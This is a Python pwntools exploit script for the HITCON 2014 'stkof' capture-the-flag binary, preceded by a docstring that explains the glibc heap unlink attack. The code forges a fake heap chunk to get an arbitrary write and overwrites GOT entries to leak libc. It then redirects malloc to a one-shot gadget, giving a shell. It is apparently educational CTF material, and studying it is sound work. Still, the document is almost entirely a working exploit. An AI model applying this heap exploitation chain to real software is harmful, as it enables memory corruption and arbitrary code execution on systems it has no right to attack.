''' explanation for the unlink attack from https://guyinatuxedo.github.io/30-unlink/hitcon14_stkof/index.html  
guyinatuxedo creates a fake chunk inside the first of the two adjacent heap chunks allocated in the beginning of exploit. The fake chunk is created at 0x14fc640, and first 4 8-byte locations (from 0x14fc640 to 0x14fc658) contain the following values: 0x0 is PREVSIZE (size of previous chunk, irelevant here), 0xa0 is size of this fake chunk, 0x602148 is pointer to FWD and 0x602150 is pointer to BK (pointers to backward and forward chunks in the doubly-linked list in this heap area)
So when the second of the two allocated chunks gets freed, it causes an unlinking of the fake chunk, and among other operations the instruction BK->fd = FD will be executed on the fake chunk.
Now BK is 0x602150, BK->fd will be the address 0x10 bytes away from 0x602150 (because for malloc() and free(), the FD or FWD (fd) pointer of whichever chunk would be at 0x602150 will be at +(0x8 + 0x8) bytes offset from 0x602150, because first 8 bytes for heap chunks is PREVSIZE, second is SIZE, and then third (16 bytes away) will be the FD pointer location), which is 0x602160
Therefore BK->fd = FD will place value at FD of fake chunk (which is 0x602148) into location of FD pointer of the fake chunk's BK pointer (0x602150), meaning that 0x602148 will be placed at address 0x602150+0x10=0x602160
That is why as the final desired outcome of this attack we see value 0x602148 written at 0x602160
The rest of the exploit is possible thanks to this method of writing values in memory using GLIBC's heap unlinking process.
'''

from pwn import *

target = process("./stkof", env={"LD_PRELOAD":"./libc-2.23.so"})
elf = ELF("stkof")
libc = ELF("libc-2.23.so")

# gdb.attach(target, gdbscript='b *0x400b7a')
raw_input()

def add(size):
    target.sendline("1")
    target.sendline(str(size))
    print(target.recvuntil("OK\n"))

def scan(index, size, data):
    target.sendline("2")
    target.sendline(str(index))
    target.sendline(str(size))
    target.send(data)
    print(target.recvuntil("OK\n"))

def remove(index):
    target.sendline("3")
    target.sendline(str(index))
    print(target.recvuntil("OK\n"))
def view(index):
    target.sendline("4")
    target.sendline(str(index))
    leak = target.recvline()
    leak = leak.replace("\x0a", "")
    leak = u64(leak + "\x00"*(8-len(leak)))
    print(hex(leak))
    print(target.recvuntil("OK\n"))
    return leak

ptr = 0x602160
add(0xa0)
add(0xa0)
add(0xa0)
add(0xa0)
add(0xa0)
add(0xa0)

fakeChunk = b""
fakeChunk += p64(0x0)
fakeChunk += p64(0xa0)
fakeChunk += p64(ptr - 0x8*3)
fakeChunk += p64(ptr - 0x8*2)
fakeChunk += p64(0x0)*((0xa0 - 0x20)/8)

fakeChunk += p64(0xa0)
fakeChunk += p64(0xb0)

scan(4, 0xb0, fakeChunk)
remove(5)

scan(1, 0x10, p64(elf.got["strlen"]) + p64(elf.got["malloc"]))
scan(1, 0x8, p64(elf.symbols["puts"]))

mallocLibc = view(2)
libcBase = mallocLibc - libc.symbols["malloc"]
oneShot = libcBase + 0xf02a4

print("libc base: " + hex(libcBase))
print("oneshot gadget: " + hex(oneShot))
scan(2, 0x8, p64(oneShot))
target.send("1\n1\n")
target.interactive()
